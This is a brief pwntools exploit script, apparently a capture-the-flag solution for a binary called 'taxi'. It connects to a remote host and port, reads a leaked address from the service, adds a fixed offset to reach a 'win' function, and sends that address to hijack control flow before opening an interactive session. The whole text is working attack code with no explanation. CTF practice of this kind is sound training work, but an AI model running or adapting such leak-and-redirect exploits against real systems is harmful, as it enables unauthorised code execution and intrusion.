from pwn import *

# p = process("./taxi")
# gdb.attach(p)

p = remote("10.212.138.23", 31601)

p.recvuntil(b"You are currently at ")
leak = int(p.recvline().decode()[:14],16)
log.success(f"{hex(leak)=}")
p.recvuntil(b"go?")

win = leak + 35
log.success(f"{hex(win)=}")

p.sendline(str(hex(win)).encode())

p.interactive()